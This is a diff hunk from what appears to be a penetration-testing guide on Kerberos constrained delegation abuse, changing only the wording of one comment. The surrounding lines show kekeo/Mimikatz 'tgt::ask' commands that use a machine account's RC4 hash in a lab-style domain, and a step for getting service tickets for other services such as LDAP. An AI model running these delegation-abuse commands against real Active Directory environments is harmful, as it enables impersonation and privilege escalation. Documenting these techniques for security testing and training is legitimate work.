@@ -140,7 +140,7 @@ tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7
 ```
 
 ```bash:kekeo + Mimikatz
-#Obtain a TGT for the Constained allowed user
+#Obtain a TGT for the constrained-delegation user
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 
 #Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
